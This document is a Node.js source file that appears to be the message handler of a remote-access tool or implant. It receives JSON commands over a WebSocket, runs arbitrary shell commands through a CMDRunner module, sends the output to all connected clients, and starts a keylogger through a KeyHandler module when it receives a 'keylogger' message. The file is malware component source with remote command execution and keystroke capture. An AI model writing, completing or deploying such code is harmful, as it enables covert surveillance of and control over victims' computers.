"use strict"

const CMDRunner = require("./CMDRunner");
// const { server, wss } = require("./Server");
const Utils = require("./Utils");
const WebSocket = require("ws");

class HandleSocketMessage
{
    constructor(ws, wss)
    {
        this._ws = ws;
        this._wss = wss;
    }

    handleMessage(strMessage)
    {
        let objMessage = HandleSocketMessage.decodeMessage(strMessage);

        switch(objMessage.title)
        {
            case "log":
                console.log(objMessage.body);
                break;
            case "execute":
                this.caseExecCommand(objMessage.body.command)
                break;
            case "keylogger":
                this.caseStartKeylogger()
                break;
            default:
                console.log("Message not configured!");
        }
    }

    caseExecCommand(strCommand)
    {
        let strOutput = CMDRunner.execCommand(strCommand);

        console.log(typeof wss);
        this._wss.clients.forEach(function each(client) 
		{
			if (client.readyState === WebSocket.OPEN) 
			{
				client.send(Utils.makeMessage(
					"CommandOutput", {output: strOutput}
				));
			}
		});
    }

    caseStartKeylogger(strCommand)
    {
	    const objKeyHandler = require("./KeyHandler");
        objKeyHandler.startListener();
    }

    static decodeMessage(strStringObject)
    {
        let objDecodedMessage = JSON.parse(strStringObject);
        return objDecodedMessage;
    }
}

module.exports = HandleSocketMessage;